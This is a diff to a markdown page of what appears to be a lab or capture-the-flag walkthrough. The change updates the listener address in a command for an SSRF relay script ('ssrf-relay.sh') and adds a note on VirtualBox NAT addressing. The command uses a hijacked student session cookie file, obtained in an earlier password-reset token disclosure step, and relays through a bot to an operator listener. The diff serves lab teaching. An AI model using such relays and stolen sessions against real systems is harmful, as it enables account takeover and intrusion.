@@ -36,8 +36,14 @@ primitive without needing the bot.
 See `ssrf-relay.sh` in this folder:
 
 ```bash
-./ssrf-relay.sh http://localhost:4942 cookies_jdoe.txt 127.0.0.1:8888
+./ssrf-relay.sh http://localhost:4942 cookies_jdoe.txt 10.0.2.2:8888
 ```
+
+> The listener must be reachable from the bot's vantage — see the Environment
+> note in [`../walkthrough.md`](../walkthrough.md). Current setup: the bot
+> runs inside a VirtualBox NAT VM and the operator on the host, so
+> `10.0.2.2:8888` is the address to pass; `127.0.0.1` only works if the bot
+> and the operator share a network namespace.
 
 Prerequisite: `cookies_jdoe.txt` is the jdoe student session created by the
 login step in `../05-password-reset-token-disclosure/`.
